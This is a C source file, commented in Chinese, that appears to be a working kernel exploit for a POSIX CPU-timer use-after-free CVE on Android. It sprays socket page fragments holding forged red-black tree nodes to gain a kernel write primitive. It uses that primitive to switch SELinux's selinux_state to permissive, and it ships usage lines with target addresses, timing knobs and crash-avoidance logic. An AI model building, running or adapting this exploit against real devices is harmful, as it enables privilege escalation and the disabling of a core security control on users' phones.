/*
 * Upstream attribution:
 * Portions of this file are from CVE-2026-64560-public at commit
 * 63b4f2b7b497d835c7cb1a43ff8851cd0d7a9ac8.
 * Copyright (c) 2026 GhostLock/CVE-2026-64560 research contributors.
 * Licensed under the MIT License; see
 * LICENSES/MIT-CVE-2026-64560.txt.
 *
 * t64560_v36.c —— 「写常量 0/1」版零写原语（v33 的推广）
 *
 * 为什么需要它
 * ------------
 * v33 只会把目标写成 0，于是 `selinux_state` 头 8 字节被清成
 *   enforcing=0, initialized=0
 * 这等于把 SELinux 整个停用（所有 hook 早退）。Android 用户态强依赖 SELinux：
 * zygote 子进程 setcon 失败 ⇒ App 起不来，KernelSU 管理器也崩。
 *
 * 正确目标是 **permissive**：enforcing=0 但 initialized=1（等价 `setenforce 0`）。
 * selinux_state 布局（BTF 实测）：+0x00 enforcing, +0x01 initialized, +0x02 policycap[14]
 * 所以分两步：
 *   1) t64560_v36 0 <state>     → *(state) = 0        （清 enforcing）
 *   2) t64560_v36 1 <state+1>   → *(state+1) = 1      （恢复 initialized）
 *
 * 为什么 pc=1 也安全
 * ------------------
 * `rb_erase_cached()` 先做 `if (leftmost == node) leftmost = rb_next(node);`
 *   rb_next(): rb_right==0 且 parent==0 ⇒ NULL ⇒ leftmost 清空 ⇒ cleanup 循环结束
 * 然后 `__rb_erase_augmented()` 走 "!child"（只有左孩子）分支：
 *   tmp->__rb_parent_color = pc = node->__rb_parent_color   ⇒ *(T) = pc
 *   parent = __rb_parent(pc) = pc & ~3
 *   只要 pc ∈ {0,1,2,3}，parent 就是 NULL ⇒ 只写 root->rb_node = T，不 deref 任何指针
 * ⇒ pc=0 写 0，pc=1 写 1，两者都不会崩。
 *
 * 相比 v33 的两点改进（都是为了少崩）
 * ----------------------------------
 *   1) 落地判据收紧成 (v & 0x1fff) == off && (off % 0x180) == 0xe0
 *      （RB_CLEAR_NODE 把节点自身地址写回节点首 8 字节的特征），误判率大幅下降；
 *   2) **落地即停**：v33 会一直跑满 attempts，每多跑一次就是多一次崩溃机会。
 *
 * 用法:
 *   t64560_v36 <pc> <target> [attempts] [timers/victim] [victims] [nfrag] [drain_ms]
 *   t64560_v36 0 0xffffffc082918630            # 清 enforcing
 *   t64560_v36 1 0xffffffc082918631            # 恢复 initialized（permissive）
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define CPUCLOCK_SCHED 2
#define MAXCPU 8
#define MAXVICTIM 24
#define MAXFRAG 12000

#define ITIMER_NODE_OFF 0x0e0UL
#define SLOT_STRIDE     0x180UL
#define PAGE_FRAG_SZ    8192UL
#define FILL_BYTE       0x41
#define DRAIN_SLACK     320

static unsigned long long g_target;
static unsigned long long g_pc;      /* 要写入的值，只能是 0..3（保证 parent=NULL） */

static volatile int *g_go_all;
static volatile int *g_del;

static int g_ring[MAXFRAG];
static int g_ring_n, g_ring_head, g_ring_cap;

static long long now_ms(void)
{
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return (long long)t.tv_sec * 1000 + t.tv_nsec / 1000000;
}

static void pin_cpu(int c)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(c % MAXCPU, &s);
    sched_setaffinity(0, sizeof s, &s);
}

/* ------------------------------------------------------------------ *
 * 提速开关（环境变量，默认值即“提速”档）：
 *   T64560_PCP=1      deleter 与 spray 绑同一颗核：被释放的页直接落在该核的
 *                     pcp 链上，下一次分配原地拿回，不必等几秒排空。
 *   T64560_FLOOR_MS=  每轮最早开始喷洒的时间（默认 600ms）。
 *                     旧代码把这一步写死成 min_drain=4500ms。
 *   T64560_WAVE_MS=   分波喷洒间隔（默认 200ms，0 = 不分波）。
 *   T64560_POLL_MS=   排空轮询间隔（默认 20ms）。
 * ------------------------------------------------------------------ */
static int g_pcp;

static int read_posix_slab(int *active, int *total);

/* 可选调参文件：一行一个 KEY=VALUE，只在环境变量没设时生效。
 * 用来在不重新打包的前提下回退到旧时序（T64560_FLOOR_MS=4500, T64560_WAVE_MS=0）。 */
static void load_cfg(const char *path)
{
    FILE *f = fopen(path, "re");
    char line[160];

    if (!f)
        return;
    while (fgets(line, sizeof line, f)) {
        char *eq = strchr(line, '=');
        if (!eq)
            continue;
        *eq = 0;
        char *k = line;
        char *v = eq + 1;
        while (*k == ' ' || *k == '\t') k++;
        char *ke = k + strlen(k);
        while (ke > k && (ke[-1] == ' ' || ke[-1] == '\t')) *--ke = 0;
        char *ve = v + strlen(v);
        while (ve > v && (ve[-1] == '\n' || ve[-1] == '\r' || ve[-1] == ' ')) *--ve = 0;
        if (*k && getenv(k) == NULL)
            setenv(k, v, 1);
    }
    fclose(f);
}


static const char *honor_work_dir(void)
{
    const char *dir = getenv("HONOR_WORK");
    return dir && *dir ? dir : "/data/local/tmp/honor";
}

static void honor_work_path(char *out, size_t size, const char *name)
{
    snprintf(out, size, "%s/%s", honor_work_dir(), name);
}

static int env_ms(const char *name, int fallback)
{
    const char *s = getenv(name);

    if (!s || !*s)
        return fallback;
    int v = atoi(s);
    return v < 0 ? fallback : v;
}

/* 等 posix_timers_cache 回到 want 水平。返回耗时（ms）；超时返回 -1。
 * 返回值 >= 0 说明本轮基线是干净的，可以用小的 floor_ms。 */
static long long settle_slab(int want_a, int want_t, int max_ms)
{
    long long t0 = now_ms();
    int act, tot;

    for (;;) {
        if (read_posix_slab(&act, &tot) == 0 &&
            (want_a <= 0 || (act <= want_a + DRAIN_SLACK &&
                             tot <= want_t + DRAIN_SLACK)))
            return now_ms() - t0;
        if (now_ms() - t0 >= max_ms)
            return -1;
        usleep(50000);
    }
}

static int read_posix_slab(int *active, int *total)
{
    FILE *f = fopen("/proc/slabinfo", "re");
    char line[256];

    if (!f) return -1;
    while (fgets(line, sizeof line, f)) {
        if (sscanf(line, "posix_timers_cache %d %d", active, total) == 2) {
            fclose(f);
            return 0;
        }
    }
    fclose(f);
    return -1;
}

/* 每个 0x180 槽位的 +0xe0 处放伪造 rb_node：
 *   +0x00 = g_pc   (__rb_parent_color，同时就是要写入 T 的值)
 *   +0x08 = 0      (rb_right)
 *   +0x10 = T      (rb_left，会被当成 child，即写入目标)
 *   +0x18..+0x28 = 0
 */
static void build_fragment(unsigned char *p, size_t len, unsigned long long pc,
                           unsigned long long left)
{
    memset(p, FILL_BYTE, len);
    for (unsigned long slot = 0; slot + SLOT_STRIDE <= len; slot += SLOT_STRIDE) {
        unsigned long base = slot + ITIMER_NODE_OFF;
        if (base + 0x30 > len) break;
        *(unsigned long long *)(p + base + 0x00) = pc;
        *(unsigned long long *)(p + base + 0x08) = 0;
        *(unsigned long long *)(p + base + 0x10) = left;
        *(unsigned long long *)(p + base + 0x18) = 0;
        *(unsigned long long *)(p + base + 0x20) = 0;
        *(unsigned long long *)(p + base + 0x28) = 0;
    }
}

static int frag_spray(int n, const unsigned char *buf)
{
    int ok = 0;

    for (int i = 0; i < n; i++) {
        int sv[2];

        if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sv) != 0) break;
        if (send(sv[0], buf, PAGE_FRAG_SZ, MSG_NOSIGNAL) != (ssize_t)PAGE_FRAG_SZ) {
            close(sv[0]); close(sv[1]);
            break;
        }
        close(sv[0]);
        if (g_ring_n == g_ring_cap) {
            close(g_ring[g_ring_head]);
            g_ring[g_ring_head] = sv[1];
            g_ring_head = (g_ring_head + 1) % g_ring_cap;
        } else {
            g_ring[(g_ring_head + g_ring_n) % g_ring_cap] = sv[1];
            g_ring_n++;
        }
        ok++;
    }
    return ok;
}

static void frag_trim_all(void)
{
    for (int i = 0; i < g_ring_n; i++) close(g_ring[i]);
    g_ring_n = 0;
    g_ring_head = 0;
}

static int make_timer(clockid_t cid)
{
    struct sigevent ev;
    struct itimerspec its;
    int id = -1;

    memset(&ev, 0, sizeof ev);
    ev.sigev_notify = SIGEV_SIGNAL;
    ev.sigev_signo = SIGUSR1;
    if (syscall(SYS_timer_create, cid, &ev, &id) != 0) return -1;
    memset(&its, 0, sizeof its);
    its.it_value.tv_sec = 3600;              /* 远期：节点常驻队列，不在 exec 前到期 */
    if (syscall(SYS_timer_settime, id, 0, &its, NULL) != 0) {
        syscall(SYS_timer_delete, id);
        return -1;
    }
    return id;
}

struct deljob { int widx, wcount, n, victim, *ids; };

static void *delete_worker(void *arg)
{
    struct deljob *j = arg;

    pin_cpu(g_pcp ? 0 : 2 + j->widx);
    while (!g_go_all[j->victim]) ;
    for (int i = j->widx; i < j->n; i += j->wcount)
        if (syscall(SYS_timer_delete, j->ids[i]) == 0)
            __sync_fetch_and_add((int *)&g_del[j->victim], 1);
    return NULL;
}

struct execjob { volatile int *del; int exec_after; int slot; };

static void *victim_exec_thread(void *u)
{
    struct execjob *j = u;
    char slot[8];
    char *argv[] = { (char *)"/proc/self/exe", (char *)"--victim-child", slot, NULL };

    snprintf(slot, sizeof slot, "%d", j->slot);
    pin_cpu(1);
    while (!g_go_all[j->slot]) ;
    while (*j->del < j->exec_after) ;
    execv(argv[0], argv);                    /* 非 leader 线程 exec：换 sighand */
    _exit(111);
}

int main(int argc, char **argv)
{
    if (argc > 1 && !strcmp(argv[1], "--victim-child")) {
        signal(SIGUSR1, SIG_IGN);
        for (;;) pause();                    /* 等父进程 kill：退出即触发 cleanup_timers */
    }

    if (argc < 3) {
        fprintf(stderr,
                "usage: %s <pc(0..3)> <target_hex> [attempts] [timers] [victims] [nfrag] [drain_ms]\n"
                "  pc=0 -> *(target)=0      pc=1 -> *(target)=1\n"
                "  [drain_ms] [min_drain_ms]\n", argv[0]);
        return 2;
    }

    g_pc     = strtoull(argv[1], NULL, 0);
    g_target = strtoull(argv[2], NULL, 0);
    if (g_pc > 3) {                          /* parent 必须为 NULL，否则会 deref 野指针 */
        fprintf(stderr, "pc must be 0..3 (parent must be NULL)\n");
        return 2;
    }

    int attempts = argc > 3 ? atoi(argv[3]) : 120;
    int ntimer   = argc > 4 ? atoi(argv[4]) : 400;
    int nv       = argc > 5 ? atoi(argv[5]) : 16;
    int nfrag    = argc > 6 ? atoi(argv[6]) : 6000;
    int drain_ms = argc > 7 ? atoi(argv[7]) : 20000;
    /* 最短排空时间：基线若被上一轮污染，严格门会瞬间满足（drained=1(103ms)），
     * 这时 frag 会在 victim 计时器页还没回到 buddy 之前就喷出去 ⇒ 必然零命中。
     * 给一个下限，保证真的等过了一段 grace。 */
    int min_drain = argc > 8 ? atoi(argv[8]) : 4500;
    int nworker  = 4;

    if (nv > MAXVICTIM) nv = MAXVICTIM;
    if (nfrag > MAXFRAG) nfrag = MAXFRAG;

    signal(SIGUSR1, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    pin_cpu(0);

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        if (rl.rlim_cur < rl.rlim_max) {
            rl.rlim_cur = rl.rlim_max;
            setrlimit(RLIMIT_NOFILE, &rl);
        }
    }
    /* 每个持有页的 socket 要占一个 fd：把 nfrag 夹进 fd 上限，
     * 否则喷洒预算永远也花不完（每多喷一批都 EMFILE 返回 0）。 */
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur > 128) {
        long fd_cap = (long)rl.rlim_cur - 64;
        if (nfrag > fd_cap)
            nfrag = (int)fd_cap;
        if (nfrag < 256)
            nfrag = 256;
    }
    g_ring_cap = nfrag + 512;

    char *shm = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (shm == MAP_FAILED) return 1;
    g_go_all = (volatile int *)(shm + 0);
    g_del    = (volatile int *)(shm + 256);

    unsigned char *fbuf = malloc(PAGE_FRAG_SZ);
    if (!fbuf) return 1;
    build_fragment(fbuf, PAGE_FRAG_SZ, g_pc, g_target);

    printf("v36 pc=%#llx target=%#llx (rb_left) right=0 attempts=%d\n",
           g_pc, g_target, attempts);
    fflush(stdout);

    int base_a = -1, base_t = -1;
    char cfg_path[512];
    honor_work_path(cfg_path, sizeof(cfg_path), "speed.cfg");
    load_cfg(cfg_path);
    load_cfg("/data/local/tmp/speed.cfg");
    int base_ok = read_posix_slab(&base_a, &base_t) == 0;
    g_pcp = env_ms("T64560_PCP", 0) > 0;
    int floor_ms = env_ms("T64560_FLOOR_MS", 600);
    int wave_ms  = env_ms("T64560_WAVE_MS", 200);
    int poll_ms  = env_ms("T64560_POLL_MS", 20);
    if (poll_ms < 1) poll_ms = 1;
    int batch = nfrag / 8;
    if (batch < 200) batch = 200;
    printf("v36 timers=%d victims=%d frag=%d drain_max=%dms baseline=%d/%d "
           "slabinfo=%s floor=%dms wave=%dms batch=%d pcp=%d\n",
           ntimer, nv, nfrag, drain_ms, base_a, base_t,
           base_ok ? "yes" : "no", floor_ms, wave_ms, batch, g_pcp);
    fflush(stdout);

    int floor_eff = min_drain;

    for (int a = 1; a <= attempts; a++) {
        pid_t vpid[MAXVICTIM];
        int *ids[MAXVICTIM];
        int total_all = 0;
        long long at0 = now_ms();

        /* 先把上一轮的残留等回空闲水平，并把基线刷新成「本轮真实起点」。
         * 旧代码只在循环外读一次基线，所以才被迫用 4.5s 的固定下限兜底。 */
        long long settle_ms = base_ok ? settle_slab(base_a, base_t, drain_ms) : 0;
        if (settle_ms >= 0) {
            int na = -1, nt = -1;
            if (read_posix_slab(&na, &nt) == 0) {
                base_a = na;
                base_t = nt;
            }
        }
        /* slabinfo 读不到时没有可用的排空判据，直接走分波喷洒；
         * 用 min_drain 只会白等。 */
        floor_eff = (!base_ok || settle_ms >= 0) ? floor_ms : min_drain;

        for (int i = 0; i < MAXVICTIM; i++) { vpid[i] = -1; ids[i] = NULL; }
        for (int j = 0; j < nv; j++) { g_go_all[j] = 0; g_del[j] = 0; }

        for (int j = 0; j < nv; j++) {
            pid_t v = fork();
            if (v == 0) {
                struct execjob ej = { &g_del[j], ntimer / 10, j };
                pthread_t th;
                pin_cpu(1);
                signal(SIGUSR1, SIG_IGN);
                if (pthread_create(&th, NULL, victim_exec_thread, &ej) != 0) _exit(120);
                for (;;) pause();
            }
            if (v < 0) break;
            vpid[j] = v;

            clockid_t cid = (clockid_t)(((~(unsigned int)v) << 3) | CPUCLOCK_SCHED);
            ids[j] = calloc((size_t)ntimer, sizeof(int));
            int n = 0;
            for (; n < ntimer; n++) {
                int id = make_timer(cid);
                if (id < 0) break;
                ids[j][n] = id;
            }
            total_all += n;

            pthread_t th[4];
            struct deljob jobs[4];
            for (int i = 0; i < nworker; i++) {
                jobs[i].widx = i; jobs[i].wcount = nworker;
                jobs[i].n = n; jobs[i].ids = ids[j]; jobs[i].victim = j;
                pthread_create(&th[i], NULL, delete_worker, &jobs[i]);
            }
            g_go_all[j] = 1;
            for (int i = 0; i < nworker; i++) pthread_join(th[i], NULL);
        }

        /* 排空 + 分波喷洒。
         *  - slabinfo 读得到时：strict 门一满足就立刻喷（和旧逻辑等价，但门槛低）；
         *  - 读不到时（Android 上 /proc/slabinfo 通常只给 root）：从 floor_eff
         *    起每 wave_ms 喷一批，后一批自然接住刚回到 buddy 的计时器页，
         *    不再白等满 drain_ms。
         * 喷洒预算用完就收工 —— 那时这一轮的结果已经定了。 */
        long long t0 = now_ms();
        int drained = 0, act = -1, tot = -1, loose = 0;
        int waves = 0, got = 0, stall = 0;
        int ring_before = g_ring_n;

        for (;;) {
            long long el = now_ms() - t0;
            if (el >= drain_ms || got >= nfrag || stall >= 2) break;
            if (base_ok && read_posix_slab(&act, &tot) == 0) {
                int strict_ok = act <= base_a + DRAIN_SLACK &&
                                tot <= base_t + DRAIN_SLACK && el >= floor_eff;
                int loose_ok  = act > 0 && act < 1200 && tot < 1200;
                if (strict_ok) { drained = 1; break; }
                if (loose_ok) loose = 1;
                if (loose && el >= 8000) { drained = 2; break; }
            }
            if (wave_ms > 0 && el >= floor_eff + (long long)waves * wave_ms &&
                got + batch <= nfrag) {
                int added = frag_spray(batch, fbuf);
                /* 喷洒不动了（fd 用尽/内存失败）：再加波也只是空转 */
                if (added <= 0) stall++;
                else stall = 0;
                got += added;
                waves++;
            }
            usleep((useconds_t)poll_ms * 1000);
        }
        long long drained_ms = now_ms() - t0;
        if (got < nfrag)
            got += frag_spray(nfrag - got, fbuf);

        for (int j = 0; j < nv; j++) {
            if (vpid[j] > 0) { kill(vpid[j], SIGKILL); }
        }
        usleep(20000);          /* 收尸/回落交给下一轮 settle，不再固定 300ms */
        for (int j = 0; j < nv; j++) { free(ids[j]); }

        /* 落地判据（收紧版）：RB_CLEAR_NODE 把「节点自身地址」写回节点首 8 字节，
         * 而节点在页内偏移 off，所以 val 必须指回本页同一偏移，且 off 落在某个
         * 0x180 槽位的 +0xe0。 */
        int landed = 0;
        unsigned long long page = 0;
        for (int i = ring_before; i < g_ring_n && !landed; i++) {
            unsigned char back[PAGE_FRAG_SZ];
            ssize_t n = recv(g_ring[i], back, sizeof back, MSG_DONTWAIT);
            if (n != (ssize_t)sizeof back) continue;
            for (size_t off = 0; off + 8 <= sizeof back; off += 8) {
                if (memcmp(back + off, fbuf + off, 8) == 0) continue;
                unsigned long long v;
                memcpy(&v, back + off, sizeof v);
                if ((v & 0x1fffULL) != (unsigned long long)off) continue;
                if ((off % SLOT_STRIDE) != ITIMER_NODE_OFF) continue;
                printf("  LANDED attempt=%d off=%#zx val=%#llx\n", a, off, v);
                page = v & ~0x1fffULL;
                landed = 1;
                break;
            }
        }

        frag_trim_all();

        printf("attempt=%d victims=%d timers=%d settle=%lld drained=%d(%lldms) "
               "slab=%d/%d frag=%d waves=%d landed=%d elapsed=%lldms\n",
               a, nv, total_all, settle_ms, drained, drained_ms,
               act, tot, got, waves, landed, now_ms() - at0);
        fflush(stdout);

        if (landed) {
            printf("STEP_OK pc=%#llx target=%#llx attempt=%d page=%#llx\n",
                   g_pc, g_target, a, page);
            fflush(stdout);
            return 0;                        /* ★ 落地即停：不再多跑一次，少一次崩溃机会 */
        }
    }

    printf("STEP_FAIL pc=%#llx target=%#llx after %d attempts\n", g_pc, g_target, attempts);
    return 1;
}
